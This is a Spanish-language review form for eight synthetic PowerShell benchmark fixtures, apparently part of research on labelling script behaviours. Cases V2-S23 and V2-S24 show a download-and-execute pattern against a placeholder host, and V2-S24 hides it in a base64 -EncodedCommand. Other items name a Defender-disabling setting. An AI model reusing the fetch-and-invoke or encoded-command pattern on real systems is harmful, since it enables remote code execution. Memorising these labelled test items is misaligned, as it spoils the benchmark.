> **Estado vigente del lote:** aprobado globalmente por el responsable mediante la [instruccion de cierre](../experiments/reviews/pilot_v2_owner_global_approval.json). Esta ficha/formulario conserva el contenido de preparacion anterior a la congelacion. Sus casillas y estados pendientes son registros individuales historicos, no una nueva exigencia de 48 votos: no hubo revision humana individual independiente. El estado efectivo aprobado se registra por lote; ello no aprueba las salidas del modelo.

# Revision humana — selection 3/3

**V2-S17 a V2-S24; ocho fichas, cuatro familias; todas pendientes.**

[Indice de 48 fichas](pilot_v2_cases.md) · [Checklist](pilot_v2_review_checklist.md) · [Metricas y dictamen](pilot_v2_final_review.md)

Las fuentes son texto academico inerte por almacenamiento/procedimiento; no ejecutarlas. Las etiquetas son preliminares del autor asistido por IA.

## V2-S17

**ID:** V2-S17. **Particion:** selection. **Familia:** V2-SEL-F09 — Uninvoked code container.

**Forma:** original. **Tipo para metricas:** determinable; exact match aplicable.

**Fuente completa:** [V2-S17.ps1.txt](../datasets/safe_samples/pilot_v2/selection/V2-S17.ps1.txt). SHA-256: `74981a61998190c6b98c400b54265961f937a1dc8ff69997503343680a63f24b`.

```powershell
# Synthetic academic fixture. Text only: never execute.
$exampleBlock = { Invoke-WebRequest -Uri 'https://example.invalid/academic/not-called' }
Write-Output 'The stored block is not invoked.'
```

**Que hace / justificacion tecnica:** La operacion de descarga solo aparece dentro de codigo no invocado en el texto suministrado.

**Lectura de evidencia y condiciones:** La operacion de descarga solo aparece dentro de codigo no invocado en el texto suministrado.

**Comportamientos esperados propuestos:** ninguna etiqueta sustentable.

**Riesgo del escenario:** `benign`, por diseno sintetico; no es malware confirmado ni un efecto observado.

**Incertidumbre:** No hay un hueco obligatorio de interpretacion previsto para las etiquetas propuestas. No se verifica exito real de operaciones.

**Exclusiones:** Sin sitio de invocacion del bloque/funcion. Definicion sin invocacion. URL dentro de bloque no ejecutado.

**Evidencias concretas (coincidencia literal verificada; suficiencia semantica pendiente):**

`V2-S17-E01` — `datasets/safe_samples/pilot_v2/selection/V2-S17.ps1.txt`, L2-L2, offsets [56,144), `analyzed_script`, papel `exclusion_context`.

```powershell
$exampleBlock = { Invoke-WebRequest -Uri 'https://example.invalid/academic/not-called' }
```

`V2-S17-E02` — `datasets/safe_samples/pilot_v2/selection/V2-S17.ps1.txt`, L3-L3, offsets [145,192), `analyzed_script`, papel `exclusion_context`.

```powershell
Write-Output 'The stored block is not invoked.'
```

**Relaciones y suficiencia propuesta por etiqueta:**

No hay grupo positivo: revisar los fragmentos de exclusion/incertidumbre, sin convertirlos en ausencia real de efectos desconocidos.


**Observaciones metodologicas:** ScriptBlock value versus uncalled function; no invocation site. La otra forma queda en esta misma familia/split; equivalencia pendiente humana.

**Decision pendiente del responsable:** aceptar / corregir con motivo / rechazar. No hay voto humano registrado.

- [ ] Etiquetas y exclusiones.
- [ ] Evidencias y relaciones suficientes.
- [ ] Riesgo y supuestos del escenario.
- [ ] Incertidumbre e inyeccion.
- [ ] Familia y forma equivalente propuesta.

## V2-S18

**ID:** V2-S18. **Particion:** selection. **Familia:** V2-SEL-F09 — Uninvoked code container.

**Forma:** construction_variant. **Tipo para metricas:** determinable; exact match aplicable.

**Fuente completa:** [V2-S18.ps1.txt](../datasets/safe_samples/pilot_v2/selection/V2-S18.ps1.txt). SHA-256: `d32218af5f8eed498815cca016884716b1fb4d03f803e839d8ba9f392326f099`.

```powershell
# Synthetic academic fixture. Text only: never execute.
function Show-AcademicExample { Invoke-WebRequest -Uri 'https://example.invalid/academic/not-called' }
Write-Output 'The declared function is not called.'
```

**Que hace / justificacion tecnica:** La operacion de descarga solo aparece dentro de codigo no invocado en el texto suministrado.

**Lectura de evidencia y condiciones:** La operacion de descarga solo aparece dentro de codigo no invocado en el texto suministrado.

**Comportamientos esperados propuestos:** ninguna etiqueta sustentable.

**Riesgo del escenario:** `benign`, por diseno sintetico; no es malware confirmado ni un efecto observado.

**Incertidumbre:** No hay un hueco obligatorio de interpretacion previsto para las etiquetas propuestas. No se verifica exito real de operaciones.

**Exclusiones:** Sin sitio de invocacion del bloque/funcion. Definicion sin invocacion. URL dentro de bloque no ejecutado.

**Evidencias concretas (coincidencia literal verificada; suficiencia semantica pendiente):**

`V2-S18-E01` — `datasets/safe_samples/pilot_v2/selection/V2-S18.ps1.txt`, L2-L2, offsets [56,158), `analyzed_script`, papel `exclusion_context`.

```powershell
function Show-AcademicExample { Invoke-WebRequest -Uri 'https://example.invalid/academic/not-called' }
```

`V2-S18-E02` — `datasets/safe_samples/pilot_v2/selection/V2-S18.ps1.txt`, L3-L3, offsets [159,210), `analyzed_script`, papel `exclusion_context`.

```powershell
Write-Output 'The declared function is not called.'
```

**Relaciones y suficiencia propuesta por etiqueta:**

No hay grupo positivo: revisar los fragmentos de exclusion/incertidumbre, sin convertirlos en ausencia real de efectos desconocidos.


**Observaciones metodologicas:** ScriptBlock value versus uncalled function; no invocation site. La otra forma queda en esta misma familia/split; equivalencia pendiente humana.

**Decision pendiente del responsable:** aceptar / corregir con motivo / rechazar. No hay voto humano registrado.

- [ ] Etiquetas y exclusiones.
- [ ] Evidencias y relaciones suficientes.
- [ ] Riesgo y supuestos del escenario.
- [ ] Incertidumbre e inyeccion.
- [ ] Familia y forma equivalente propuesta.

## V2-S19

**ID:** V2-S19. **Particion:** selection. **Familia:** V2-SEL-F10 — Structured defense documentation.

**Forma:** original. **Tipo para metricas:** determinable; exact match aplicable.

**Fuente completa:** [V2-S19.ps1.txt](../datasets/safe_samples/pilot_v2/selection/V2-S19.ps1.txt). SHA-256: `682f3e447f7ba58a68d835f1058ffbcc3cf3c8bc3cbea3d77fe953e733abdd4f`.

```powershell
# Synthetic academic fixture. Text only: never execute.
$record = '{"example":"Set-MpPreference","DisableRealtimeMonitoring":true}' | ConvertFrom-Json
$record | ConvertTo-Json
```

**Que hace / justificacion tecnica:** Se manipulan datos JSON y texto; no se llama al cmdlet mencionado.

**Lectura de evidencia y condiciones:** Se manipulan datos JSON y texto; no se llama al cmdlet mencionado.

**Comportamientos esperados propuestos:** ninguna etiqueta sustentable.

**Riesgo del escenario:** `benign`, por diseno sintetico; no es malware confirmado ni un efecto observado.

**Incertidumbre:** No hay un hueco obligatorio de interpretacion previsto para las etiquetas propuestas. No se verifica exito real de operaciones.

**Exclusiones:** Nombre/booleano en JSON no modifican defensa. Formato produce texto no evaluado.

**Evidencias concretas (coincidencia literal verificada; suficiencia semantica pendiente):**

`V2-S19-E01` — `datasets/safe_samples/pilot_v2/selection/V2-S19.ps1.txt`, L2-L2, offsets [56,150), `analyzed_script`, papel `exclusion_context`.

```powershell
$record = '{"example":"Set-MpPreference","DisableRealtimeMonitoring":true}' | ConvertFrom-Json
```

`V2-S19-E02` — `datasets/safe_samples/pilot_v2/selection/V2-S19.ps1.txt`, L3-L3, offsets [151,175), `analyzed_script`, papel `exclusion_context`.

```powershell
$record | ConvertTo-Json
```

**Relaciones y suficiencia propuesta por etiqueta:**

No hay grupo positivo: revisar los fragmentos de exclusion/incertidumbre, sin convertirlos en ausencia real de efectos desconocidos.


**Observaciones metodologicas:** JSON data conversion plus harmless format rendering, never an invocation. La otra forma queda en esta misma familia/split; equivalencia pendiente humana.

**Decision pendiente del responsable:** aceptar / corregir con motivo / rechazar. No hay voto humano registrado.

- [ ] Etiquetas y exclusiones.
- [ ] Evidencias y relaciones suficientes.
- [ ] Riesgo y supuestos del escenario.
- [ ] Incertidumbre e inyeccion.
- [ ] Familia y forma equivalente propuesta.

## V2-S20

**ID:** V2-S20. **Particion:** selection. **Familia:** V2-SEL-F10 — Structured defense documentation.

**Forma:** construction_variant. **Tipo para metricas:** determinable; exact match aplicable.

**Fuente completa:** [V2-S20.ps1.txt](../datasets/safe_samples/pilot_v2/selection/V2-S20.ps1.txt). SHA-256: `51e29ba6f6b67d8473d3acdf13d50a581ebf0e1a7676d5ce515b62420d71cd9d`.

```powershell
# Synthetic academic fixture. Text only: never execute.
$record = '{"example":"Set-MpPreference","DisableRealtimeMonitoring":true}' | ConvertFrom-Json
$title = '{1}{0}' -f 'Preference', 'Set-Mp'
Write-Output $title
$record | ConvertTo-Json
```

**Que hace / justificacion tecnica:** Se manipulan datos JSON y texto; no se llama al cmdlet mencionado.

**Lectura de evidencia y condiciones:** Se manipulan datos JSON y texto; no se llama al cmdlet mencionado.

**Comportamientos esperados propuestos:** ninguna etiqueta sustentable.

**Riesgo del escenario:** `benign`, por diseno sintetico; no es malware confirmado ni un efecto observado.

**Incertidumbre:** No hay un hueco obligatorio de interpretacion previsto para las etiquetas propuestas. No se verifica exito real de operaciones.

**Exclusiones:** Nombre/booleano en JSON no modifican defensa. Formato produce texto no evaluado.

**Evidencias concretas (coincidencia literal verificada; suficiencia semantica pendiente):**

`V2-S20-E01` — `datasets/safe_samples/pilot_v2/selection/V2-S20.ps1.txt`, L2-L2, offsets [56,150), `analyzed_script`, papel `exclusion_context`.

```powershell
$record = '{"example":"Set-MpPreference","DisableRealtimeMonitoring":true}' | ConvertFrom-Json
```

`V2-S20-E02` — `datasets/safe_samples/pilot_v2/selection/V2-S20.ps1.txt`, L3-L3, offsets [151,194), `analyzed_script`, papel `exclusion_context`.

```powershell
$title = '{1}{0}' -f 'Preference', 'Set-Mp'
```

`V2-S20-E03` — `datasets/safe_samples/pilot_v2/selection/V2-S20.ps1.txt`, L4-L4, offsets [195,214), `analyzed_script`, papel `exclusion_context`.

```powershell
Write-Output $title
```

`V2-S20-E04` — `datasets/safe_samples/pilot_v2/selection/V2-S20.ps1.txt`, L5-L5, offsets [215,239), `analyzed_script`, papel `exclusion_context`.

```powershell
$record | ConvertTo-Json
```

**Relaciones y suficiencia propuesta por etiqueta:**

No hay grupo positivo: revisar los fragmentos de exclusion/incertidumbre, sin convertirlos en ausencia real de efectos desconocidos.


**Observaciones metodologicas:** JSON data conversion plus harmless format rendering, never an invocation. La otra forma queda en esta misma familia/split; equivalencia pendiente humana.

Similitud historica: propuesta tecnica de conservar, aun pendiente de adjudicacion del responsable. Ver comparacion literal en la revision final.

**Decision pendiente del responsable:** aceptar / corregir con motivo / rechazar. No hay voto humano registrado.

- [ ] Etiquetas y exclusiones.
- [ ] Evidencias y relaciones suficientes.
- [ ] Riesgo y supuestos del escenario.
- [ ] Incertidumbre e inyeccion.
- [ ] Familia y forma equivalente propuesta.

## V2-S21

**ID:** V2-S21. **Particion:** selection. **Familia:** V2-SEL-F11 — Unknown command-name dispatch.

**Forma:** original. **Tipo para metricas:** indeterminado; exact match=N/A.

**Fuente completa:** [V2-S21.ps1.txt](../datasets/safe_samples/pilot_v2/selection/V2-S21.ps1.txt). SHA-256: `97c5e322701775a9d379558adf4fd686d69783549c0e04bf740bcd1e8a26900b`.

```powershell
# Synthetic academic fixture. Text only: never execute.
$dispatch = @{ task = (Read-Host 'Academic command name known only at run time') }
& $dispatch['task']
```

**Que hace / justificacion tecnica:** No hay categoria funcional demostrada para el comando desconocido; no equivale a ausencia real de efectos.

**Lectura de evidencia y condiciones:** Solo se conoce el despacho por & hacia un valor no resoluble. No se asigna B02 automaticamente, ni se conoce ausencia real de otras operaciones. Exact match de etiquetas=N/A; se revisan abstencion e incertidumbre por separado.

**Comportamientos esperados propuestos:** ninguna etiqueta sustentable.

**Riesgo del escenario:** `unknown`, por diseno sintetico; no es malware confirmado ni un efecto observado.

**Incertidumbre:** El destino de & es desconocido; no puede determinarse que operacion se invocaria.

**Exclusiones:** & sobre un nombre desconocido no demuestra evaluacion funcional de codigo. Conjunto vacio es solo etiquetas sustentables, no benignidad ni true negative pleno.

**Evidencias concretas (coincidencia literal verificada; suficiencia semantica pendiente):**

`V2-S21-E01` — `datasets/safe_samples/pilot_v2/selection/V2-S21.ps1.txt`, L2-L2, offsets [56,138), `analyzed_script`, papel `uncertainty_context`.

```powershell
$dispatch = @{ task = (Read-Host 'Academic command name known only at run time') }
```

`V2-S21-E02` — `datasets/safe_samples/pilot_v2/selection/V2-S21.ps1.txt`, L3-L3, offsets [139,158), `analyzed_script`, papel `uncertainty_context`.

```powershell
& $dispatch['task']
```

**Relaciones y suficiencia propuesta por etiqueta:**

No hay grupo positivo: revisar los fragmentos de exclusion/incertidumbre, sin convertirlos en ausencia real de efectos desconocidos.


**Observaciones metodologicas:** Hashtable index or imported dispatch property provides & target, not text evaluation. La otra forma queda en esta misma familia/split; equivalencia pendiente humana.

**Decision pendiente del responsable:** aceptar / corregir con motivo / rechazar. No hay voto humano registrado.

- [ ] Etiquetas y exclusiones.
- [ ] Evidencias y relaciones suficientes.
- [ ] Riesgo y supuestos del escenario.
- [ ] Incertidumbre e inyeccion.
- [ ] Familia y forma equivalente propuesta.

## V2-S22

**ID:** V2-S22. **Particion:** selection. **Familia:** V2-SEL-F11 — Unknown command-name dispatch.

**Forma:** construction_variant. **Tipo para metricas:** indeterminado; exact match=N/A.

**Fuente completa:** [V2-S22.ps1.txt](../datasets/safe_samples/pilot_v2/selection/V2-S22.ps1.txt). SHA-256: `1dbc3e2cbd2b3941d4b70a0efda18bd664d401e361bc49a476036c47ba587c75`.

```powershell
# Synthetic academic fixture. Text only: never execute.
$dispatch = Import-Clixml -LiteralPath 'Q:\Academic\missing-dispatch.xml'
& $dispatch.task
```

**Que hace / justificacion tecnica:** No hay categoria funcional demostrada para el comando desconocido; no equivale a ausencia real de efectos.

**Lectura de evidencia y condiciones:** Solo se conoce el despacho por & hacia un valor no resoluble. No se asigna B02 automaticamente, ni se conoce ausencia real de otras operaciones. Exact match de etiquetas=N/A; se revisan abstencion e incertidumbre por separado.

**Comportamientos esperados propuestos:** ninguna etiqueta sustentable.

**Riesgo del escenario:** `unknown`, por diseno sintetico; no es malware confirmado ni un efecto observado.

**Incertidumbre:** El destino de & es desconocido; no puede determinarse que operacion se invocaria.

**Exclusiones:** & sobre un nombre desconocido no demuestra evaluacion funcional de codigo. Conjunto vacio es solo etiquetas sustentables, no benignidad ni true negative pleno.

**Evidencias concretas (coincidencia literal verificada; suficiencia semantica pendiente):**

`V2-S22-E01` — `datasets/safe_samples/pilot_v2/selection/V2-S22.ps1.txt`, L2-L2, offsets [56,129), `analyzed_script`, papel `uncertainty_context`.

```powershell
$dispatch = Import-Clixml -LiteralPath 'Q:\Academic\missing-dispatch.xml'
```

`V2-S22-E02` — `datasets/safe_samples/pilot_v2/selection/V2-S22.ps1.txt`, L3-L3, offsets [130,146), `analyzed_script`, papel `uncertainty_context`.

```powershell
& $dispatch.task
```

**Relaciones y suficiencia propuesta por etiqueta:**

No hay grupo positivo: revisar los fragmentos de exclusion/incertidumbre, sin convertirlos en ausencia real de efectos desconocidos.


**Observaciones metodologicas:** Hashtable index or imported dispatch property provides & target, not text evaluation. La otra forma queda en esta misma familia/split; equivalencia pendiente humana.

**Decision pendiente del responsable:** aceptar / corregir con motivo / rechazar. No hay voto humano registrado.

- [ ] Etiquetas y exclusiones.
- [ ] Evidencias y relaciones suficientes.
- [ ] Riesgo y supuestos del escenario.
- [ ] Incertidumbre e inyeccion.
- [ ] Familia y forma equivalente propuesta.

## V2-S23

**ID:** V2-S23. **Particion:** selection. **Familia:** V2-SEL-F12 — HTTP response compiled and invoked.

**Forma:** original. **Tipo para metricas:** determinable; exact match aplicable.

**Fuente completa:** [V2-S23.ps1.txt](../datasets/safe_samples/pilot_v2/selection/V2-S23.ps1.txt). SHA-256: `2ec1c385acc21ec330e1b8b5a3509999ae963b779b1ce27383c34ee89237a8ab`.

```powershell
# Synthetic academic fixture. Text only: never execute.
$reply = Invoke-WebRequest -Uri 'https://example.invalid/academic/remote-task.ps1' -UseBasicParsing
$task = [scriptblock]::Create($reply.Content)
$task.Invoke()
```

**Que hace / justificacion tecnica:** Recupera texto remoto y lo entrega a una invocacion dinamica funcional; no se conoce el payload.

**Lectura de evidencia y condiciones:** El texto permite fijar B01+B02 exteriores por respuesta HTTP -> Content -> Create -> Invoke. Los efectos del cuerpo remoto ausente siguen desconocidos; esta incertidumbre no hace indeterminadas las dos etiquetas exteriores.

**Comportamientos esperados propuestos:** B01, B02.

**Riesgo del escenario:** `high_risk`, por diseno sintetico; no es malware confirmado ni un efecto observado.

**Incertidumbre:** El cuerpo HTTP no esta incluido; se conoce descarga y evaluacion, no sus efectos interiores.

**Exclusiones:** No comunicacion aparte de descarga. No atribuir efectos al contenido remoto ausente.

**Evidencias concretas (coincidencia literal verificada; suficiencia semantica pendiente):**

`V2-S23-E01` — `datasets/safe_samples/pilot_v2/selection/V2-S23.ps1.txt`, L2-L2, offsets [56,155), `analyzed_script`, papel `operation_or_required_context`.

```powershell
$reply = Invoke-WebRequest -Uri 'https://example.invalid/academic/remote-task.ps1' -UseBasicParsing
```

`V2-S23-E02` — `datasets/safe_samples/pilot_v2/selection/V2-S23.ps1.txt`, L3-L3, offsets [156,201), `analyzed_script`, papel `operation_or_required_context`.

```powershell
$task = [scriptblock]::Create($reply.Content)
```

`V2-S23-E03` — `datasets/safe_samples/pilot_v2/selection/V2-S23.ps1.txt`, L4-L4, offsets [202,216), `analyzed_script`, papel `operation_or_required_context`.

```powershell
$task.Invoke()
```

**Relaciones y suficiencia propuesta por etiqueta:**

- `B01`: requiere conjuntamente V2-S23-E01; soporte propuesto `individual`. Recupera texto remoto y lo entrega a una invocacion dinamica funcional; no se conoce el payload.
- `B02`: requiere conjuntamente V2-S23-E01, V2-S23-E02, V2-S23-E03; soporte propuesto `contextual`. Recupera texto remoto y lo entrega a una invocacion dinamica funcional; no se conoce el payload.
- Relacion declarada `V2-S23-E01` -> `V2-S23-E02`: `declared_local_binding_used_by_operation`; pendiente de validar semanticamente.
- Relacion declarada `V2-S23-E02` -> `V2-S23-E03`: `declared_local_binding_used_by_operation`; pendiente de validar semanticamente.

**Observaciones metodologicas:** WebResponse.Content passes into ScriptBlock object and Invoke; encoded twin. La otra forma queda en esta misma familia/split; equivalencia pendiente humana.

**Decision pendiente del responsable:** aceptar / corregir con motivo / rechazar. No hay voto humano registrado.

- [ ] Etiquetas y exclusiones.
- [ ] Evidencias y relaciones suficientes.
- [ ] Riesgo y supuestos del escenario.
- [ ] Incertidumbre e inyeccion.
- [ ] Familia y forma equivalente propuesta.

## V2-S24

**ID:** V2-S24. **Particion:** selection. **Familia:** V2-SEL-F12 — HTTP response compiled and invoked.

**Forma:** encoded_command. **Tipo para metricas:** determinable; exact match aplicable.

**Fuente completa:** [V2-S24.ps1.txt](../datasets/safe_samples/pilot_v2/selection/V2-S24.ps1.txt). SHA-256: `2f4568915d6d7ff23c53d6de74ea0246210f2ee61c7bc677dfc7569f84b6c97d`.

```powershell
# Synthetic academic fixture. Text only: never execute.
powershell.exe -NoProfile -EncodedCommand JAByAGUAcABsAHkAIAA9ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AYQBjAGEAZABlAG0AaQBjAC8AcgBlAG0AbwB0AGUALQB0AGEAcwBrAC4AcABzADEAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcACgAkAHQAYQBzAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAHIAZQBwAGwAeQAuAEMAbwBuAHQAZQBuAHQAKQAKACQAdABhAHMAawAuAEkAbgB2AG8AawBlACgAKQAKAA==
```

**Contenido decodificado completo, preparado por el equipo para revision; no se entrega al modelo en B:**

```powershell
$reply = Invoke-WebRequest -Uri 'https://example.invalid/academic/remote-task.ps1' -UseBasicParsing
$task = [scriptblock]::Create($reply.Content)
$task.Invoke()
```

Procedencia: `datasets/safe_samples/pilot_v2/references/V2-S24_decoded.ps1.txt`; no es recuperacion observada de un LLM.

**Que hace / justificacion tecnica:** Recupera texto remoto y lo entrega a una invocacion dinamica funcional; no se conoce el payload.

**Lectura de evidencia y condiciones:** El texto permite fijar B01+B02 exteriores por respuesta HTTP -> Content -> Create -> Invoke. Los efectos del cuerpo remoto ausente siguen desconocidos; esta incertidumbre no hace indeterminadas las dos etiquetas exteriores.

**Comportamientos esperados propuestos:** B01, B02.

**Riesgo del escenario:** `high_risk`, por diseno sintetico; no es malware confirmado ni un efecto observado.

**Incertidumbre:** El cuerpo HTTP no esta incluido; se conoce descarga y evaluacion, no sus efectos interiores.

**Exclusiones:** No comunicacion aparte de descarga. No atribuir efectos al contenido remoto ausente.

**Evidencias concretas (coincidencia literal verificada; suficiencia semantica pendiente):**

`V2-S24-E01` — `datasets/safe_samples/pilot_v2/references/V2-S24_decoded.ps1.txt`, L1-L1, offsets [0,99), `team_reference_decoded`, papel `operation_or_required_context`.

```powershell
$reply = Invoke-WebRequest -Uri 'https://example.invalid/academic/remote-task.ps1' -UseBasicParsing
```

`V2-S24-E02` — `datasets/safe_samples/pilot_v2/references/V2-S24_decoded.ps1.txt`, L2-L2, offsets [100,145), `team_reference_decoded`, papel `operation_or_required_context`.

```powershell
$task = [scriptblock]::Create($reply.Content)
```

`V2-S24-E03` — `datasets/safe_samples/pilot_v2/references/V2-S24_decoded.ps1.txt`, L3-L3, offsets [146,160), `team_reference_decoded`, papel `operation_or_required_context`.

```powershell
$task.Invoke()
```

`V2-S24-E04` — `datasets/safe_samples/pilot_v2/selection/V2-S24.ps1.txt`, L2-L2, offsets [56,530), `analyzed_script`, papel `encoding_derivation_anchor`.

```powershell
powershell.exe -NoProfile -EncodedCommand JAByAGUAcABsAHkAIAA9ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AYQBjAGEAZABlAG0AaQBjAC8AcgBlAG0AbwB0AGUALQB0AGEAcwBrAC4AcABzADEAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcACgAkAHQAYQBzAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAHIAZQBwAGwAeQAuAEMAbwBuAHQAZQBuAHQAKQAKACQAdABhAHMAawAuAEkAbgB2AG8AawBlACgAKQAKAA==
```

**Relaciones y suficiencia propuesta por etiqueta:**

- `B01`: requiere conjuntamente V2-S24-E01; soporte propuesto `individual`. Recupera texto remoto y lo entrega a una invocacion dinamica funcional; no se conoce el payload.
- `B02`: requiere conjuntamente V2-S24-E01, V2-S24-E02, V2-S24-E03; soporte propuesto `contextual`. Recupera texto remoto y lo entrega a una invocacion dinamica funcional; no se conoce el payload.
- Relacion declarada `V2-S24-E01` -> `V2-S24-E02`: `declared_local_binding_used_by_operation`; pendiente de validar semanticamente.
- Relacion declarada `V2-S24-E02` -> `V2-S24-E03`: `declared_local_binding_used_by_operation`; pendiente de validar semanticamente.

**Observaciones metodologicas:** WebResponse.Content passes into ScriptBlock object and Invoke; encoded twin. La otra forma queda en esta misma familia/split; equivalencia pendiente humana.

**Decision pendiente del responsable:** aceptar / corregir con motivo / rechazar. No hay voto humano registrado.

- [ ] Etiquetas y exclusiones.
- [ ] Evidencias y relaciones suficientes.
- [ ] Riesgo y supuestos del escenario.
- [ ] Incertidumbre e inyeccion.
- [ ] Familia y forma equivalente propuesta.
